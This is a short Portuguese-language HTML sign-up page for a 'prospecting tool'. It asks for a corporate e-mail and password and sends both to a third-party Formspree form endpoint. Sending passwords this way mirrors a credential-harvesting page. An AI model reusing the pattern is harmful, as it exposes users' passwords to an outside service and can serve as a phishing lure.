<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso ferramenta de Prospecção</title>
    <style>
        body {
            background-color: #000000;
            color: #D4AF37;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #111111;
            padding: 40px;
            border-radius: 10px;
            border: 1px solid #D4AF37;
            box-shadow: 0px 0px 20px rgba(212, 175, 55, 0.2);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h2 {
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-size: 0.9em;
        }

        input {
            width: 100%;
            padding: 12px;
            background-color: #222;
            border: 1px solid #444;
            border-radius: 5px;
            color: white;
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            border-color: #D4AF37;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #D4AF37;
            color: black;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            transition: background 0.3s;
        }

        button:hover {
            background-color: #b8962e;
        }

        p {
            font-size: 0.8em;
            color: #888;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Cadastro de Acesso</h2>
        <p>Preencha os dados para criarmos sua conta na ferramenta.</p>
        
        <!-- Altere o link abaixo no campo action -->
        <form action="https://formspree.io/f/meenjpwn" method="POST">
            <div class="input-group">
                <label>E-mail Corporativo</label>
                <input type="email" name="email" placeholder="seu@email.com" required>
            </div>

            <div class="input-group">
                <label>Senha Desejada</label>
                <input type="password" name="password" placeholder="Digite sua senha" required>
            </div>

            <button type="submit">Enviar Dados</button>
        </form>
    </div>

</body>
</html>
